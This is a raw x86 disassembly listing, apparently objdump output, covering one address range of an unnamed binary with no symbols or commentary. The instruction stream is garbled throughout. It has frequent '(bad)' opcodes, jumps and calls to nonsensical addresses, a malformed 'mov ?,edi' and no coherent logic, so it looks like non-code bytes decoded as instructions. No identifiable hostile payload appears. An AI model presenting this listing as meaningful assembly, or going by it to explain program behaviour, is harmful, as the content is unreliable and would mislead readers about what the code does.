  4172ec:	inc    DWORD PTR [ecx-0x6e483400]
  4172f2:	enter  0x8389,0x8d
  4172f6:	inc    DWORD PTR [eax]
  4172f8:	add    bh,cl
  4172fa:	sar    bh,1
  4172fc:	jmp    FWORD PTR [ebx-0x1]
  4172ff:	inc    eax
  417301:	pop    ebx
  417302:	push   ecx
  417303:	(bad)  
  417304:	call   FWORD PTR [edx-0x45027c7d]
  41730a:	into   
  41730b:	add    BYTE PTR [eax],al
  41730d:	mov    eax,ds:0xf0fecc83
  417312:	fdiv   st(7),st
  417314:	add    BYTE PTR [eax+0x0],al
  417317:	jmp    DWORD PTR [ecx]
  417319:	pushf  
  41731a:	int    0x0
  41731c:	jmp    FWORD PTR ds:0x23fc8300
  417322:	mov    bh,0x89
  417324:	inc    DWORD PTR [edx-0x1]
  417327:	add    BYTE PTR [ebx-0x3c],dh
  41732a:	test   bh,bh
  41732c:	add    BYTE PTR [ebx],dl
  41732e:	add    BYTE PTR [ebx-0x7cd21303],al
  417334:	int3   
  417335:	fwait
  417336:	add    BYTE PTR [ecx-0x7cfe3259],cl
  41733c:	(bad)  
  41733d:	in     al,dx
  41733e:	(bad)  
  41733f:	push   esi
  417341:	sbb    al,0xa2
  417343:	int3   
  417344:	mov    DWORD PTR [ebx-0x76947c77],edi
  41734a:	jae    0x41734c
  41734c:	mov    DWORD PTR [ebp+0x0],ebx
  41734f:	jmp    ebp
  417351:	sbb    cl,BYTE PTR [ecx-0x34]
  417354:	(bad)  
  417355:	in     al,dx
  417356:	add    BYTE PTR [eax],al
  417358:	xor    eax,0xffff0674
  41735d:	bound  eax,QWORD PTR [eax]
  41735f:	mov    DWORD PTR [ebx],eax
  417361:	cmp    edi,DWORD PTR [ebp-0x338a0000]
  417367:	dec    DWORD PTR [esi+eiz*2]
  41736a:	mov    eax,ds:0x7eff00
  41736f:	call   DWORD PTR [esi+0x8394c7]
  417375:	mov    BYTE PTR [eax],0x0
  417378:	sbb    al,0x64
  41737a:	ror    esp,cl
  41737c:	(bad)  
  41737d:	jnp    0x41737f
  41737f:	(bad)  
  417380:	stc    
  417381:	ret    0xffd0
  417384:	dec    DWORD PTR ds:0xa14d0083
  41738a:	ud0    eax,DWORD PTR [eax]
  41738d:	ror    DWORD PTR [ecx+0xac32aff],cl
  417393:	add    bh,bh
  417395:	push   edx
  417396:	(bad)  
  417397:	push   DWORD PTR [eax-0x1c]
  41739a:	lods   eax,DWORD PTR ds:[esi]
  41739b:	(bad)  
  41739c:	call   DWORD PTR [ecx]
  41739e:	inc    DWORD PTR [ebx-0x7c409f81]
  4173a4:	add    BYTE PTR [ecx-0x1],ch
  4173a7:	sbb    DWORD PTR [ebx],0x12
  4173aa:	fcos   
  4173ac:	(bad)  
  4173ad:	jge    0x4173af
  4173af:	add    BYTE PTR [esi],dl
  4173b1:	rcl    DWORD PTR [ebx-0x1],0xff
  4173b5:	jmp    0x25c773b9
  4173ba:	add    DWORD PTR [eax],eax
  4173bc:	call   DWORD PTR [edi-0x4e8b007d]
  4173c2:	(bad)  
  4173c3:	inc    DWORD PTR [eax]
  4173c5:	pop    es
  4173c6:	or     esp,0x54
  4173c9:	jmp    0xff00:0xe2000077
  4173d0:	mov    edi,0xff006d13
  4173d5:	sar    bh,1
  4173d7:	add    BYTE PTR [ecx-0x330061e3],ch
  4173dd:	out    0x83,al
  4173df:	add    BYTE PTR [ebx+edi*4+0x35ff004e],ch
  4173e6:	add    BYTE PTR [ebx-0xd954ec],al
  4173ec:	jmp    DWORD PTR [ebx]
  4173ee:	inc    DWORD PTR [eax]
  4173f0:	(bad)  
  4173f1:	stos   BYTE PTR es:[edi],al
  4173f2:	cmp    eax,0x2f00ff
  4173f7:	(bad)  
  4173f8:	cmp    al,0xd0
  4173fa:	clc    
  4173fb:	add    BYTE PTR [ecx+0x6ecc89e7],cl
  417401:	push   0xbb0083c2
  417406:	inc    DWORD PTR [eax]
  417408:	(bad)  
  417409:	sbb    al,0x96
  41740b:	inc    DWORD PTR [ebx-0xc7cffc9]
  417411:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417412:	mov    bl,0xff
  417414:	jmp    FWORD PTR [edi+0x0]
  417417:	mov    edx,ecx
  417419:	mov    bh,0x74
  41741b:	add    bh,bh
  41741d:	cmp    bh,0x0
  417420:	dec    esp
  417421:	jecxz  0x4173d6
  417423:	inc    DWORD PTR [eax]
  417425:	jp     0x417427
  417427:	sub    edx,0xffffffd7
  41742a:	fs add bh,bh
  41742d:	add    ecx,DWORD PTR [ecx-0x22f9767d]
  417433:	inc    DWORD PTR [ebx-0x7400005d]
  417439:	jo     0x417442
  41743b:	cmp    edi,0xffffffc8
  41743e:	add    bh,bh
  417440:	popa   
  417441:	mov    DWORD PTR [eax+0x0],ecx
  417444:	add    BYTE PTR [esi],ch
  417446:	inc    DWORD PTR [eax]
  417448:	aaa    
  417449:	int3   
  41744a:	sub    bh,bh
  41744c:	jmp    FWORD PTR [esi+0x0]
  41744f:	mov    DWORD PTR [edx],edi
  417451:	ret    
  417452:	xchg   edx,eax
  417453:	inc    DWORD PTR [ebx+0x7e00ff97]
  417459:	ds mov ecx,0x83ce00ff
  41745f:	add    BYTE PTR [edi-0x76af23],cl
  417465:	jmp    0x417466
  417467:	add    BYTE PTR [edx-0x5fee],bh
  41746d:	outs   dx,BYTE PTR ds:[esi]
  41746e:	inc    DWORD PTR [ebx-0xfc49d1]
  417474:	add    BYTE PTR [ebp+0x607d89ff],ch
  41747a:	push   esp
  41747b:	inc    DWORD PTR [ebx-0x6b0000c7]
  417481:	xchg   edi,eax
  417482:	mov    DWORD PTR [eax],eax
  417484:	mov    DWORD PTR [esi],esi
  417486:	(bad)  
  417487:	inc    DWORD PTR [eax-0x33ff0534]
  41748d:	or     DWORD PTR [ecx-0x353f701],ecx
  417493:	(bad)  
  417494:	call   DWORD PTR [eax+0x5b3400ff]
  41749a:	push   cs
  41749b:	add    DWORD PTR [eax],0x3f
  41749e:	add    bh,bh
  4174a0:	int3   
  4174a1:	aaa    
  4174a2:	stc    
  4174a3:	int3   
  4174a4:	add    BYTE PTR [ebp+0x68d38383],bh
  4174aa:	or     eax,0xff79ffff
  4174af:	push   esi
  4174b1:	sti    
  4174b2:	pop    es
  4174b3:	inc    DWORD PTR [eax]
  4174b5:	in     eax,0xcc
  4174b7:	add    BYTE PTR [ebx],al
  4174b9:	lahf   
  4174ba:	mov    al,ds:0xffce8383
  4174bf:	mov    DWORD PTR [ebp+0x43],esp
  4174c2:	inc    DWORD PTR [bx+si]
  4174c5:	fisttp DWORD PTR [ecx+0x3ec41183]
  4174cb:	inc    DWORD PTR [eax]
  4174cd:	dec    esi
  4174ce:	add    BYTE PTR [ebx-0x479730],al
  4174d4:	add    BYTE PTR ds:0x913cffff,ah
  4174da:	or     eax,DWORD PTR [eax]
  4174dc:	dec    DWORD PTR [ebp+0x221e00cc]
  4174e2:	push   esi
  4174e3:	(bad)  
  4174e4:	(bad)  
  4174e5:	mov    esi,0x9b8ffff
  4174ea:	jbe    0x41746f
  4174ec:	push   DWORD PTR [eax]
  4174ee:	add    bh,bh
  4174f0:	cs pop ss
  4174f2:	ja     0x4174f4
  4174f4:	inc    DWORD PTR [eax]
  4174f6:	add    DWORD PTR [ebx+0xbe5b6c],0xffffffff
  4174fd:	scas   al,BYTE PTR es:[edi]
  4174fe:	add    BYTE PTR [eax],al
  417500:	hlt    
  417501:	aaa    
  417502:	lahf   
  417503:	dec    esp
  417505:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417506:	inc    DWORD PTR [eax]
  417508:	rcr    DWORD PTR [ebp-0x26ffff3b],0xff
  41750f:	add    BYTE PTR [eax],ah
  417511:	repz sub al,0x0
  417514:	add    BYTE PTR [edx-0x1],bl
  417517:	add    ah,ah
  417519:	adc    DWORD PTR [edx-0x200001],ecx
  41751f:	(bad)  
  417520:	cmp    BYTE PTR [eax-0x70],dh
  417523:	cmp    edi,0xffffffcd
  417526:	add    DWORD PTR [eax],0xa
  417529:	push   ds
  41752a:	pop    DWORD PTR [eax]
  41752c:	add    BYTE PTR [ecx],bh
  41752e:	dec    DWORD PTR [ecx-0x393026]
  417534:	inc    edi
  417536:	add    BYTE PTR [ebx-0xe3b55c],al
  41753c:	add    BYTE PTR [edx-0x28ec0100],ah
  417542:	pop    esi
  417543:	(bad)  
  417544:	dec    eax
  417546:	int3   
  417547:	mov    DWORD PTR [edx],edx
  417549:	adc    edx,DWORD PTR [eax-0x7c5d3400]
  41754f:	int3   
  417550:	mov    ch,0xb7
  417552:	xchg   edx,eax
  417553:	(bad)  
  417554:	jmp    esi
  417556:	cmp    edi,0x17
  417559:	(bad)  
  41755a:	cmp    esp,ecx
  41755c:	jmp    FWORD PTR [ebx+0x71be00ff]
  417562:	outs   dx,DWORD PTR ds:[esi]
  417563:	mov    edi,edi
  417565:	imul   edi,edi,0xffffffff
  417568:	imul   edi,DWORD PTR [ecx],0xffffffb7
  41756b:	mov    DWORD PTR [eax],eax
  41756d:	aaa    
  41756e:	add    BYTE PTR [eax],al
  417570:	adc    DWORD PTR [edx-0x75],eax
  417573:	int3   
  417574:	add    BYTE PTR [eax],bl
  417576:	cmp    edi,0xffffffe2
  417579:	cmc    
  41757a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41757b:	add    DWORD PTR [eax],0x2a
  41757e:	add    BYTE PTR [ebx-0xa2a46f],al
  417584:	inc    DWORD PTR [edx]
  417586:	(bad)  
  417587:	jmp    FWORD PTR [ecx]
  417589:	clc    
  41758a:	cmp    edi,0x0
  41758d:	jl     0x41758e
  41758f:	push   DWORD PTR [eax-0xff24a6]
  417595:	enter  0xff00,0x67
  417599:	add    al,0x58
  41759b:	dec    DWORD PTR [ecx-0x4100ffc8]
  4175a1:	enter  0xffae,0xff
  4175a5:	cdq    
  4175a6:	add    DWORD PTR [eax],0x74
  4175a9:	(bad)  
  4175aa:	in     eax,dx
  4175ab:	(bad)  
  4175ac:	(bad)  
  4175ad:	cmp    edi,edi
  4175af:	dec    DWORD PTR [ecx+ecx*1+0x47]
  4175b3:	(bad)  
  4175b4:	push   ecx
  4175b6:	add    BYTE PTR [ecx-0x70c729],cl
  4175bc:	(bad)  
  4175bd:	jl     0x4175be
  4175bf:	xor    DWORD PTR [ebx],0x5a
  4175c2:	sbb    eax,0xf8ffff
  4175c7:	(bad)  
  4175c8:	fst    DWORD PTR [eax-0x55]
  4175cb:	inc    DWORD PTR [eax]
  4175cd:	mov    ds:0x40deff00,al
  4175d2:	xor    al,0x0
  4175d4:	add    BYTE PTR ds:0x9e1a8383,dh
  4175da:	(bad)  
  4175dc:	dec    DWORD PTR [edx-0x4887ff7d]
  4175e2:	jmp    0x843f75e6
  4175e7:	add    bl,dl
  4175e9:	inc    esp
  4175ea:	mov    cl,0xff
  4175ec:	add    BYTE PTR [eax+0x0],cl
  4175ef:	call   DWORD PTR [esi+0xff5f84]
  4175f5:	ins    BYTE PTR es:[edi],dx
  4175f6:	(bad)  
  4175f7:	dec    DWORD PTR [eax]
  4175f9:	sub    BYTE PTR [edi+edi*8-0xb01],bh
  417600:	push   ss
  417601:	dec    esp
  417602:	int3   
  417603:	add    DWORD PTR [eax],0xa
  417606:	inc    DWORD PTR [eax]
  417608:	jae    0x41766e
  41760a:	and    eax,0xff2dffff
  41760f:	add    BYTE PTR [edi-0x9467],dl
  417615:	fdiv   st(7),st
  417617:	or     DWORD PTR [edx+0x34],0xffffffcb
  41761b:	add    bh,bh
  41761d:	std    
  41761e:	add    bh,bh
  417620:	lock push edx
  417622:	add    edi,edi
  417624:	jmp    DWORD PTR [edx+0x0]
  417627:	mov    edi,edi
  417629:	inc    ebx
  41762a:	mov    ebx,0x5800cc
  41762f:	add    BYTE PTR [ecx],dh
  417631:	and    ah,al
  417633:	int3   
  417634:	add    DWORD PTR [edi+edi*8+0x2b6867cc],0xffffffff
  41763c:	dec    DWORD PTR [ebp+0x144689ff]
  417642:	mov    ah,0xff
  417644:	mov    DWORD PTR [ecx+0x0],edx
  417647:	(bad)  
  417648:	frstor [esi+edx*8-0x7d]
  41764c:	add    BYTE PTR [ecx+0x6562ffff],ch
  417652:	mov    bh,bh
  417654:	adc    ebp,0xffffffff
  417657:	(bad)  
  417658:	fisttp DWORD PTR ds:0x4600ff25
  41765e:	add    bh,bh
  417660:	dec    edx
  417661:	das    
  417662:	pop    ebx
  417663:	add    bh,bh
  417665:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417666:	inc    DWORD PTR [ebx-0x19a5c9]
  41766c:	add    BYTE PTR [ecx],dh
  41766e:	cmp    edi,0x54
  417671:	jnp    0x417666
  417673:	add    DWORD PTR [eax],0xffffffe4
  417676:	inc    DWORD PTR [eax]
  417678:	pusha  
  417679:	pop    ebx
  41767a:	dec    eax
  41767b:	int3   
  41767c:	add    BYTE PTR [edx],bh
  41767e:	int3   
  41767f:	(bad)  
  417680:	stc    
  417681:	push   edi
  417682:	jecxz  0x417684
  417684:	add    BYTE PTR [edi],ah
  417686:	int3   
  417687:	sbb    DWORD PTR [edx+0x83e7e3],0xffffffab
  41768e:	inc    DWORD PTR [eax]
  417690:	test   DWORD PTR [edx],ebp
  417692:	cmc    
  417693:	(bad)  
  417694:	dec    DWORD PTR [ecx+0x167eff83]
  41769a:	mov    eax,ds:0xff8483ff
  41769f:	int3   
  4176a0:	es push ds
  4176a2:	inc    ecx
  4176a3:	add    DWORD PTR [eax],0x2d
  4176a6:	dec    esp
  4176a8:	gs inc esi
  4176aa:	stos   BYTE PTR es:[edi],al
  4176ab:	inc    DWORD PTR [eax]
  4176ad:	(bad)  
  4176af:	jmp    DWORD PTR [edi+0x74]
  4176b2:	mov    dl,0xff
  4176b4:	(bad)  
  4176b5:	fild   WORD PTR [ebx+0x1cf12c00]
  4176bb:	inc    DWORD PTR [eax]
  4176bd:	xor    ecx,DWORD PTR [ecx-0x7c3b4500]
  4176c3:	int3   
  4176c4:	sub    DWORD PTR [ecx],0xffffffff
  4176c7:	push   DWORD PTR [edx-0x6344]
  4176cd:	ss add bh,bh
  4176d0:	inc    esp
  4176d1:	mov    dl,0x45
  4176d3:	inc    DWORD PTR [eax]
  4176d5:	or     BYTE PTR [eax],al
  4176d7:	push   DWORD PTR [esi-0x76ffc1e9]
  4176dd:	add    al,0xcc
  4176df:	call   ecx
  4176e1:	cli    
  4176e2:	xor    bh,bh
  4176e4:	(bad)  
  4176e5:	mov    ebx,0x48e00000
  4176ea:	mov    ebx,0xffa20000
  4176ef:	mov    DWORD PTR [ecx+0x2a],esi
  4176f2:	cmp    edi,edi
  4176f4:	(bad)  
  4176f5:	jl     0x41767a
  4176f7:	call   FWORD PTR [ebx]
  4176f9:	dec    edx
  4176fa:	fwait
  4176fb:	(bad)  
  4176fc:	(bad)  
  4176fd:	mov    ebp,0x5ec28383
  417702:	adc    al,BYTE PTR [eax]
  417704:	adc    DWORD PTR [eax+0x0],0x0
  417708:	dec    esi
  417709:	sub    bh,BYTE PTR [edx-0x1]
  41770c:	call   esp
  41770e:	add    BYTE PTR [eax],al
  417710:	mov    esp,0xccf5de
  417715:	idiv   bh
  417717:	mov    DWORD PTR [ecx],edx
  417719:	cli    
  41771a:	retf   0xff
  41771d:	and    al,0x89
  41771f:	cmp    ebp,0xffffffaf
  417722:	mov    cs,WORD PTR [ecx-0x7cff8e01]
  417728:	aam    0x3c
  41772a:	adc    al,0xff
  41772c:	call   FWORD PTR [ecx+0x4b14ff00]
  417732:	outs   dx,BYTE PTR ds:[esi]
  417733:	mov    edi,edi
  417735:	jo     0x417737
  417737:	add    BYTE PTR [ecx+0xff0147],bl
  41773d:	sbb    cl,BYTE PTR [ecx-0x13c68c01]
  417743:	add    bh,bh
  417745:	jge    0x4176d0
  417747:	mov    DWORD PTR [esi-0xdb24],ebx
  41774d:	mov    ?,edi
  41774f:	add    BYTE PTR ds:0x2377,al
  417755:	ins    DWORD PTR es:[edi],dx
  417756:	add    BYTE PTR [eax],al
  417758:	and    ebp,DWORD PTR [ecx-0x2dff7cf1]
  41775e:	add    ah,cl
  417760:	add    cl,ah
  417762:	cmp    cl,BYTE PTR [ecx+0xff58ff]
  417768:	xchg   ebp,eax
  417769:	ds mov cl,0xff
  41776c:	add    BYTE PTR [edx],al
  41776e:	(bad)  
  41776f:	jmp    FWORD PTR [ecx-0xa]
  417772:	scas   al,BYTE PTR es:[edi]
  417773:	dec    DWORD PTR [ecx-0x47600d5]
  417779:	into   
  41777a:	adc    edi,edi
  41777c:	add    dh,cl
  41777e:	add    bh,bh
  417780:	mov    ecx,0x8900e609
  417785:	xchg   DWORD PTR [ebx+0x37ab5eff],eax
  41778b:	(bad)  
  41778c:	jmp    FWORD PTR [ebx+0x33ab00ff]
  417792:	pop    ss
  417793:	dec    DWORD PTR [ecx-0x647cffec]
  417799:	scas   eax,DWORD PTR es:[edi]
  41779a:	xchg   BYTE PTR [ebx+0xff86ff],al
  4177a0:	ins    BYTE PTR es:[edi],dx
  4177a1:	sbb    eax,0x1bccff6c
  4177a6:	dec    esp
  4177a8:	inc    esp
  4177a9:	add    eax,0xe00896b
  4177ae:	inc    DWORD PTR [eax]
  4177b0:	pop    ebx
  4177b1:	mov    eax,DWORD PTR [ecx-0x1]
  4177b4:	(bad)  
  4177b5:	jp     0x4177b6
  4177b7:	add    BYTE PTR [esi],bl
  4177b9:	xchg   ebp,eax
  4177ba:	xor    al,BYTE PTR [ebx-0x7c7c1501]
  4177c0:	in     eax,dx
  4177c1:	cdq    
  4177c2:	pop    esp
  4177c3:	(bad)  
  4177c4:	jmp    FWORD PTR [ebp-0x1]
  4177c7:	add    bh,dh
  4177c9:	data16 inc BYTE PTR [eax]
  4177cc:	add    al,bh
  4177ce:	dec    esp
  4177d0:	aam    0x2a
  4177d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177d3:	inc    DWORD PTR [eax]
  4177d5:	jecxz  0x4177d7
  4177d7:	add    ebp,0x65
  4177da:	inc    eax
  4177db:	add    bh,bh
  4177dd:	add    eax,0x5dc800ff
  4177e2:	cmp    edi,0x89830600
  4177e8:	icebp  
  4177e9:	iret   
  4177ea:	dec    ebp
  4177eb:	mov    edi,edi
  4177ed:	outs   dx,DWORD PTR ds:[esi]
  4177ee:	(bad)  
  4177ef:	inc    DWORD PTR [ecx-0x1a]
  4177f2:	xor    DWORD PTR [eax],eax
  4177f4:	call   DWORD PTR [esi]
  4177f6:	inc    DWORD PTR [eax]
  4177f8:	add    eax,0xffffa9b4
  4177fd:	mov    bl,0xff
  4177ff:	jmp    DWORD PTR [edi]
  417801:	sub    BYTE PTR [ecx-0x1],bh
  417804:	inc    edi
  417806:	add    BYTE PTR [eax],al
  417808:	lock add eax,0xfbff830a
  41780e:	mov    DWORD PTR [ecx+0x453902],ecx
  417814:	sub    DWORD PTR [edi+edi*8-0x31632001],0xffffffff
  41781c:	sbb    ebx,0xffffffff
  41781f:	add    BYTE PTR [ebx],ch
  417821:	adc    eax,0xc3890013
  417826:	mov    DWORD PTR [eax],eax
  417828:	arpl   WORD PTR [esi],ax
  41782a:	pop    esp
  41782b:	add    bh,bh
  41782d:	into   
  41782e:	inc    DWORD PTR [ebx-0x1df6fd]
  417834:	add    BYTE PTR [esi-0x1],dl
  417837:	sub    DWORD PTR ds:0x83004f4e,0x63
  41783e:	(bad)  
  41783f:	inc    ebx
  417841:	retf   0xfa
  417844:	inc    DWORD PTR [ebx]
  417846:	add    DWORD PTR [ebx-0x7c81ea57],0xffffff89
  41784d:	push   esp
  41784e:	add    bh,bh
  417850:	rcl    BYTE PTR [ebp+0x5898379],cl
  417856:	(bad)  
  417857:	jmp    edx
  417859:	sub    DWORD PTR [edx-0x3378767d],0x0
  417860:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417861:	dec    esp
  417862:	sbb    bh,bh
  417864:	add    BYTE PTR [ecx],bh
  417866:	(bad)  
  417867:	call   FWORD PTR [ebp-0x6e]
  41786a:	imul   edi,edi,0xff40cc
  417870:	test   al,0xf3
  417872:	dec    ecx
  417873:	mov    DWORD PTR [eax],eax
  417875:	sbb    bh,bh
  417877:	(bad)  
  417878:	(bad)  
  417879:	(bad)  
  41787a:	push   0x0
  41787c:	xor    DWORD PTR [eax+0x5e7bffff],0xffffffaa
  417883:	int3   
  417884:	call   DWORD PTR [edx-0x34]
  417887:	jmp    FWORD PTR [esp+esi*8-0xc]
  41788b:	inc    DWORD PTR [eax]
  41788d:	add    DWORD PTR [eax],0xbb33de83
  417893:	add    bh,bh
  417895:	fwait
  417896:	add    BYTE PTR [eax],al
  417898:	ds js  0x4178e8
  41789b:	int3   
  41789c:	inc    DWORD PTR [esi-0x1]
  41789f:	dec    eax
  4178a1:	adc    edx,ebx
  4178a3:	(bad)  
  4178a4:	(bad)  
  4178a5:	cmp    BYTE PTR [eax],al
  4178a7:	add    BYTE PTR [edx],bh
  4178a9:	cmp    DWORD PTR [eax-0x7c440077],esi
  4178af:	add    BYTE PTR [eax+0x2b],dh
  4178b2:	fdivp  st(7),st
  4178b4:	push   esp
  4178b6:	(bad)  
  4178b7:	(bad)  
  4178b8:	cli    
  4178b9:	push   edi
  4178ba:	jbe    0x4178bc
  4178bc:	call   FWORD PTR [ecx-0x1]
  4178bf:	inc    eax
  4178c1:	mov    edi,0xb40000eb
  4178c6:	add    bh,bh
  4178c8:	push   ecx
  4178c9:	ds jecxz 0x4178cb
  4178cc:	add    BYTE PTR [eax-0x34],bl
  4178cf:	jmp    esi
  4178d1:	push   ss
  4178d2:	sbb    al,0xff
  4178d4:	add    BYTE PTR [ebx+eax*4],ch
  4178d7:	mov    DWORD PTR [edi+ebp*8],esp
  4178da:	iret   
  4178db:	inc    DWORD PTR [eax]
  4178dd:	mov    BYTE PTR [eax],0x0
  4178e0:	fistp  DWORD PTR [ebx+0xbff00f8]
  4178e6:	inc    DWORD PTR [ebx+0xc1b185]
  4178ec:	add    bh,bl
  4178ee:	inc    DWORD PTR [eax]
  4178f0:	pop    edi
  4178f1:	(bad)  
  4178f3:	(bad)  
  4178f4:	(bad)  
  4178f5:	jmp    0xff2a:0x4adfffff
  4178fc:	call   DWORD PTR [esi+0x0]
  4178ff:	call   DWORD PTR [edx+0x4c]
  417902:	pop    edi
  417903:	add    bh,bh
  417905:	mov    eax,ds:0x62f50000
  41790a:	sub    eax,DWORD PTR [eax]
  41790c:	call   FWORD PTR [edx-0x34]
  41790f:	(bad)  
  417910:	sti    
  417911:	adc    eax,0x488389fd
  417916:	mov    DWORD PTR [ebx+0x826b5b],eax
  41791c:	inc    DWORD PTR [eax+eax*1-0x1]
  417920:	pop    edi
  417921:	jle    0x417941
  417923:	add    bh,bh
  417925:	fdiv   st(7),st
  417927:	mov    DWORD PTR [ebx+0x3c3d],ebp
  41792d:	pushf  
  41792e:	mov    DWORD PTR [eax],eax
  417930:	adc    DWORD PTR [ecx*4+0xe5ff83],edi
  417937:	inc    DWORD PTR [edi+0xd]
  41793a:	xchg   esi,eax
  41793b:	(bad)  
  41793c:	inc    edx
  41793e:	mov    DWORD PTR [eax],eax
  417940:	inc    ebx
  417941:	jo     0x41796e
  417943:	inc    DWORD PTR [ebx-0x3b76ff3e]
  417949:	outs   dx,DWORD PTR ds:[esi]
  41794a:	ret    
  41794b:	(bad)  
  41794c:	jmp    esp
  41794e:	inc    DWORD PTR [ebx-0x850f41]
  417954:	mov    eax,esi
  417956:	add    BYTE PTR [eax],al
  417958:	aam    0x46
  41795a:	out    0xcc,al
  41795c:	jmp    DWORD PTR [ebp+0x69ab83ff]
  417962:	dec    ecx
  417963:	add    BYTE PTR [ecx-0x45ff7630],cl
  417969:	sub    esp,DWORD PTR [ebp-0x1]
  41796c:	add    BYTE PTR [edx-0x1],bh
  41796f:	mov    DWORD PTR [ebx+0x68],edx
  417972:	or     al,0xff
  417974:	push   DWORD PTR [edi]
  417976:	dec    esp
  417978:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417979:	xchg   ebp,eax
  41797a:	lock int3 
  41797c:	add    BYTE PTR [ecx+0x0],ah
  41797f:	add    dl,dh
  417981:	fcomp  QWORD PTR [ecx+0xe80089]
  417987:	call   DWORD PTR [edx+0x67]
  41798a:	dec    ebp
  41798b:	(bad)  
  41798c:	call   DWORD PTR [ecx+0x0]
  41798f:	inc    DWORD PTR [esi]
  417991:	pop    edi
  417992:	cmp    DWORD PTR [eax],eax
  417994:	(bad)  
  417995:	jl     0x41791a
  417997:	adc    DWORD PTR [esi],0x5b
  41799a:	lock (bad) 
  41799c:	call   DWORD PTR [ebp-0x1]
  41799f:	add    BYTE PTR [edi+0x62],cl
  4179a2:	pop    edi
  4179a3:	(bad)  
  4179a4:	inc    ebp
  4179a6:	add    BYTE PTR [eax],al
  4179a8:	outs   dx,BYTE PTR ds:[esi]
  4179a9:	jbe    0x417976
  4179ab:	add    DWORD PTR [eax],0x34
  4179ae:	int3   
  4179af:	call   ebp
  4179b1:	hlt    
  4179b2:	cmp    edi,0xffcc8083
  4179b8:	(bad)  
  4179b9:	jge    0x4179cf
  4179bb:	(bad)  
  4179bc:	call   DWORD PTR [edi+edi*8]
  4179bf:	int3   
  4179c0:	inc    esp
  4179c1:	or     DWORD PTR [edx-0x1],edi
  4179c4:	add    BYTE PTR [edi],bl
  4179c6:	add    bh,bh
  4179c8:	js     0x417a19
  4179ca:	sar    edi,0xff
  4179cd:	stc    
  4179ce:	inc    DWORD PTR [eax]
  4179d0:	test   al,0xec
  4179d2:	push   ebx
  4179d3:	add    BYTE PTR [ecx-0x33ffffc1],cl
  4179d9:	sar    bh,1
  4179db:	inc    DWORD PTR [eax]
  4179dd:	dec    esp
  4179de:	add    BYTE PTR [ebx-0x33af98b5],al
  4179e4:	add    BYTE PTR [ecx-0x1],ch
  4179e7:	adc    esi,0xfffffffd
  4179ea:	hlt    
  4179eb:	add    bh,bh
  4179ed:	in     al,0xcc
  4179ef:	(bad)  
  4179f0:	cmp    ebp,edi
  4179f2:	push   0xffffffff
  4179f4:	add    BYTE PTR [ebp-0x41c17d00],ch
  4179fa:	jo     0x4179fb
  4179fc:	inc    DWORD PTR [esi]
  4179fe:	int3   
  4179ff:	add    BYTE PTR [eax+0x6],bl
  417a02:	test   al,0x83
  417a04:	(bad)  
  417a05:	out    dx,eax
  417a06:	dec    esp
  417a08:	xor    eax,0xffffea29
  417a0d:	data16 add BYTE PTR [eax],al
  417a10:	pop    ecx
  417a11:	out    0x1d,eax
  417a13:	dec    DWORD PTR [ecx+0x6a0083d4]
  417a19:	les    eax,FWORD PTR [ebp-0x3377ff7d]
  417a1f:	int3   
  417a20:	sbb    DWORD PTR [esi-0xf7c009b],ecx
  417a26:	int3   
  417a27:	jmp    DWORD PTR [edi+0xff7edc]
  417a2d:	in     eax,0xff
  417a2f:	add    BYTE PTR [esp+esi*8+0xd],cl
  417a33:	cmp    edi,0xffffffdc
  417a36:	(bad)  
  417a37:	inc    DWORD PTR [ebx+ebp*2+0x3a]
  417a3b:	dec    esp
  417a3d:	ret    0xff00
  417a40:	mov    ebx,0xccffd2c8
  417a45:	cmp    eax,0x87420089
  417a4a:	outs   dx,BYTE PTR ds:[esi]
  417a4b:	inc    DWORD PTR [ebx-0x7f33ffb2]
  417a51:	push   DWORD PTR [eax-0xb60100]
  417a57:	add    BYTE PTR [edx+edi*4],ah
  417a5a:	test   BYTE PTR [ebx-0xff517d],0x68
  417a61:	cmp    al,0x39
  417a63:	add    DWORD PTR [ebx-0x797c76f6],0xf
  417a6a:	jmp    0x77a6f
  417a6f:	adc    DWORD PTR [eax-0x53],0xffffff92
  417a73:	cmp    edi,0xffffffc6
  417a76:	inc    DWORD PTR [eax]
  417a78:	cli    
  417a79:	adc    eax,0x918389c5
  417a7e:	dec    esp
  417a80:	sub    dh,bl
  417a82:	push   ebp
  417a83:	inc    DWORD PTR [ebx+0x51008941]
  417a89:	jmp    0x83cc:0x36ff00d3
  417a90:	mov    bl,0xd9
  417a92:	stos   BYTE PTR es:[edi],al
  417a93:	(bad)  
  417a94:	jmp    FWORD PTR [esi]
  417a96:	add    BYTE PTR [eax],al
  417a98:	xchg   DWORD PTR [eax+0x7],ebp
  417a9b:	or     esp,0xffffff88
  417a9e:	inc    DWORD PTR [eax]
  417aa0:	inc    ecx
  417aa1:	and    bl,ah
  417aa3:	int3   
  417aa4:	jmp    DWORD PTR [eax-0x1]
  417aa7:	call   DWORD PTR [esi+0xfd7a]
  417aad:	test   al,0xff
  417aaf:	mov    DWORD PTR [esp+ebp*2],edi
  417ab2:	call   0x2fff:0x83b8ff00
  417ab9:	xchg   ecx,eax
  417aba:	jg     0x417abb
  417abc:	add    BYTE PTR [esi+0x0],bl
  417abf:	int3   
  417ac0:	pushf  
  417ac1:	xlat   BYTE PTR ds:[ebx]
  417ac2:	xchg   edi,eax
  417ac3:	add    BYTE PTR [ebx-0x1f33001e],al
  417ac9:	xchg   ecx,eax
  417aca:	or     al,0xcc
  417acc:	(bad)  
  417acd:	jmp    0x417a58
  417acf:	add    bl,al
  417ad1:	cwde   
  417ad2:	or     esp,0xffcccb00
  417ad8:	pop    edx
  417ad9:	dec    ebp
  417ada:	adc    bh,bh
  417adc:	add    ah,dl
  417ade:	cmp    edi,0x72
  417ae1:	repz inc DWORD PTR [bp+di+0x6a]
  417ae7:	cmp    DWORD PTR [esi+0x40],0xffffff88
  417aeb:	inc    DWORD PTR [ebx-0x57337ca2]
  417af1:	ret    0x89f9
  417af4:	call   FWORD PTR [ecx]
  417af6:	add    DWORD PTR [ebx-0x7c3fb674],0xffffffcc
  417afd:	std    
  417afe:	add    bh,bh
